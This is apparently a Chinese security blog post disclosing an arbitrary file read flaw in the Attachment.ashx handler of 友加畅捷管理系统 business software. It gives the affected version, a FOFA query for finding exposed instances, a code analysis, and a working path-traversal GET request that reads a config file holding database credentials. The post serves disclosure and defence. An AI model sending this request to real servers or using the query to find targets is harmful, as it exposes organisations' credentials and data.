---
title: "友加畅捷管理系统 Attachment.ashx 任意文件读取漏洞"
source: https://mrxn.net/jswz/youjiasoft-Attachment-file-read.html
asset_dir: assets/友加畅捷管理系统-attachment.ashx-任意文件读取漏洞
---

# 友加畅捷管理系统 Attachment.ashx 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/25 08:36
- 491浏览
- [0评论](#comment)
- 8分钟阅读

深入探索

Web安全课程

企业安全咨询

SQL注入检测工具

---

# 漏洞简介

友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理软件，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。

该系统的 `Attachment.ashx` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。攻击者可利用此漏洞，未经授权地读取服务器上的任意文件，包括但不限于系统配置文件和数据库配置文件等敏感信息。 成功利用此漏洞可能导致企业内部敏感数据泄露，对系统的机密性和完整性构成潜在威胁。

# 影响版本

13.7004.1053.1000

# fofa语法

> icon\_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="

# 漏洞分析

深入探索

文本剥离工具

漏洞扫描器

编程语言教程

直接查看 `/Controllers/ajax/Attachment.ashx` 文件的代码引用

```
<%@ WebHandler Language="C#" CodeBehind="Attachment.ashx.cs" Class="CnSub.Web.Controllers.Attachment" %>
```

直接在 `bin` 目录下反编译 `CnSub.Web.dll` 获取 **Controllers.ajax.Attachment** 处理逻辑

[![友加畅捷管理系统 Attachment.ashx 任意文件读取漏洞](images/img-001-5c479143efdc.webp)](https://image.mrxn.net/542753e203504927940731a3ab470a7e.webp)

GET请求参数 `attachmentUrl` 被直接拼接在网站**upfile/Email/**目录下，然后带入 `new FileStream` 方法进行操作，期间无任何过滤或校验，因此造成任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

深入探索

编码转换工具

计算机安全

安全工具开发

# 漏洞复现

```
GET /Controllers/ajax/Attachment.ashx?attachmentUrl=../../config/sysconfig_zts.fig HTTP/1.1
Host: youjiasoft.mrxn.net
```

[![友加畅捷管理系统 Attachment.ashx 任意文件读取漏洞](images/img-002-685286d25667.webp)](https://image.mrxn.net/54fa536fb31840cd9e7f96f751b3da49.webp)

成功读取到 `config/sysconfig_zts.fig` 文件内容，其中包含数据库连接信息。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
